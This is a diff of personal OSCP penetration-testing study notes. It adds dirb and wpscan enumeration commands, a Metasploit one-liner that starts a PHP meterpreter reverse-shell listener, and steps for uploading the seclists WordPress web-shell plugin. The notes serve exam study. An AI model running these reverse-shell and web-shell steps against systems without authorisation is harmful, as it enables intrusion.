@@ -92,10 +92,26 @@ All kind of enumeration topics
 
 **Search for Directories**
 
+*dirb*
+
+    dirb <url>
+
 *dirbuster - with UI*
 
 Good to download a wordlist from github
 take a big one and remove "manual"
+
+**Enumeration**
+
+*Wordpress Scan*
+
+Plugins are having the potential of beeing outdated.
+
+    wpscan --url <url> --enumerate ap,at,cd,dbe
+    ap - include all Plugins
+    at - include all themes
+    cb - include all coonfig backups
+    dbe - database exports
 
 *analysis for vulnerabilities*
 
@@ -702,12 +718,14 @@ python give you debug information
 
 alternative to nc - only once allowed in OSCP better use nc
 
-    msfconsole
-    use exploit/multi/handler
-    set LHOST 192.168.134.129
-    set LPORT 4444
-    set payload php/meterpreter/reverse_tcp
-    exploit
+    sudo msfconsole -q -x "use exploit/multi/handler;\
+    set payload php/meterpreter/reverse_tcp;\ 
+    set LHOST 192.168.134.129;\
+    set LPORT 4444 ;\
+    run"
+
+    -q - start quietly
+    -x - passing payload settings
 
 on DVWA the page is called via parameter "?page=" enter here the malicious page as goal
 
@@ -981,18 +999,42 @@ https://github.com/pentestmonkey/php-reverse-shell
 
     run-parts /etc/cron.daily
 
-*Additional*
+*Call URL via console*
+
+    curl <url>
+
+*Show open ports in kali*
+
+    sudo netstat -tulpn
+
+*Malicious Plugin*
+
+    sudo apt install seclists
+
+*Wordpress exploitation*
+
+Once seclists are installed it can be found in /usr/share/seclists and the plugin can be found under Web-Shells/WordPress.
+The malicious plugin is called "plugin-shell.php"
+
+*Connect to MySQL DB in Kali*
+
+    mysql --host=<ip> --port=<port> --user= <user> -p 
+    ip - would be 127.0.0.1 in case of port forwarding
+    port - the port where the portforward is running at
+
+**Additional**
 
 Good for notes is Cherrytree.
 https://www.giuspen.com/cherrytree/#downl 
 
 https://www.reddit.com/r/oscp/ 
 
-
 **Mount shared Folder**
 
     #!/bin/bash
     sudo mount -t vboxsf share/~share
+
+
 
 
 
